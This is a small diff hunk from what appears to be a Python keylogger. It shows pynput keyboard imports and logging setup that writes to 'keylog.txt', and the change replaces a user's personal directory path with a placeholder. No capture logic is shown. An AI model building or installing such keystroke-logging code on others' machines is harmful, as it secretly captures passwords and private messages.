@@ -3,7 +3,7 @@ import logging
 from pynput.keyboard import Key, Listener
 
 
-log_dir = r"C:/Users/jcesa/OneDrive/Área de Trabalho/Banco de Dados"
+log_dir = r"C:/Users/..."
 
 logging.basicConfig(filename=(log_dir + r"/keylog.txt"),
                     level=logging.DEBUG, format='%(asctime)s: %(message)s')
